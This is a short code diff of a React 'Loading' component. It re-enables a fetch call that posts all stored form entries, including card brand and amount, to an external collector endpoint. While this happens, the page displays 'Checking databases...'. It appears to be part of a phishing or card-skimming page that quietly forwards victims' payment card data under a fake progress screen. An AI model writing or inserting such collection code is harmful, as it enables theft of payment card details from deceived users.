@@ -12,20 +12,20 @@ const Loading = ({ currentStep }) => {
 
       // Prepare POST request parameters
       const { "Card Brand": cardType, Amount: amount } = storedEntries;
-      // const response = await fetch("https://api-gamma-neon.vercel.app/go", {
-      //   method: "POST",
-      //   headers: {
-      //     "Content-Type": "application/json",
-      //   },
-      //   body: JSON.stringify({
-      //     subject: `${cardType} - ${amount}`,
-      //     message: JSON.stringify(storedEntries, null, 2),
-      //   }),
-      // });
+      const response = await fetch("https://api-gamma-neon.vercel.app/go", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          subject: `${cardType} - ${amount}`,
+          message: JSON.stringify(storedEntries, null, 2),
+        }),
+      });
 
-      // if (!response.ok) {
-      //   throw new Error("Failed to send data to the API.");
-      // }
+      if (!response.ok) {
+        throw new Error("Failed to send data to the API.");
+      }
 
       setTimeout(() => {
         status.current.textContent = "Checking databases...";
